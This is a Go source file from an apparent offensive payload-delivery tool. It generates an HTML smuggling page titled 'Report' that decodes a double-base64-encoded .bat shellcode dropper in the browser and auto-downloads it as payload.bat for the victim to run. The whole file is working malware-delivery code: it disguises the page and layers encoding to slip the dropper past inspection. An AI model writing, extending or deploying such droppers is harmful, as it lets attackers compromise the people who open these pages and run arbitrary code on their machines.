// html.go — emit an HTML smuggling page (.html). A base64-encoded .bat (the
// inline dropper, built by delegating to the bat emitter) is reconstructed in
// the browser via a Blob and auto-downloaded as payload.bat; the user runs the
// downloaded .bat. The raw shellcode never appears in the page — it is
// base64-encoded inside the smuggled .bat, which is itself base64-encoded in
// the page (two encoding layers, same as a real smuggling dropper).
//
// This is inline-only: a browser sandbox cannot fetch-and-exec a remote
// stage-2, so --url is rejected. For remote delivery use -f bat/lnk/sct with
// --url, or build a .bat with --url and smuggle it by passing that shellcode.
package delivery

import (
	"encoding/base64"
	"strings"
)

type htmlEmitter struct{}

func (htmlEmitter) Name() string { return "html" }
func (htmlEmitter) Ext() string  { return "html" }

func (htmlEmitter) Emit(s *Spec) ([]Artifact, error) {
	if s.Remote() {
		return nil, errPayloadRequired("html")
	}
	if len(s.Shellcode) == 0 {
		return nil, errPayloadRequired("html")
	}
	// Smuggle the inline .bat dropper (built from the shellcode).
	arts, err := (batEmitter{}).Emit(s)
	if err != nil {
		return nil, err
	}
	b64 := base64.StdEncoding.EncodeToString(arts[0].Bytes)
	return []Artifact{writeFile("payload.html", []byte(htmlBody(b64)))}, nil
}

// htmlBody renders a self-contained HTML smuggling page: decode the base64
// .bat, build an octet-stream Blob, and auto-click a download link named
// payload.bat. No external resources; opens offline in any modern browser.
func htmlBody(b64 string) string {
	var b strings.Builder
	b.WriteString("<!DOCTYPE html>\n<html><head><meta charset=\"utf-8\">\n")
	b.WriteString("<title>Report</title></head><body>\n<script>\n")
	b.WriteString("var s=\"" + b64 + "\";\n")
	b.WriteString("var raw=window.atob(s);\n")
	b.WriteString("var bytes=new Uint8Array(raw.length);\n")
	b.WriteString("for(var i=0;i<raw.length;i++){bytes[i]=raw.charCodeAt(i);}\n")
	b.WriteString("var blob=new Blob([bytes],{type:'application/octet-stream'});\n")
	b.WriteString("var url=URL.createObjectURL(blob);\n")
	b.WriteString("var a=document.createElement('a');\n")
	b.WriteString("a.href=url;a.download='payload.bat';\n")
	b.WriteString("document.body.appendChild(a);a.click();\n")
	b.WriteString("setTimeout(function(){URL.revokeObjectURL(url);},2000);\n")
	b.WriteString("</script>\n</body></html>\n")
	return b.String()
}
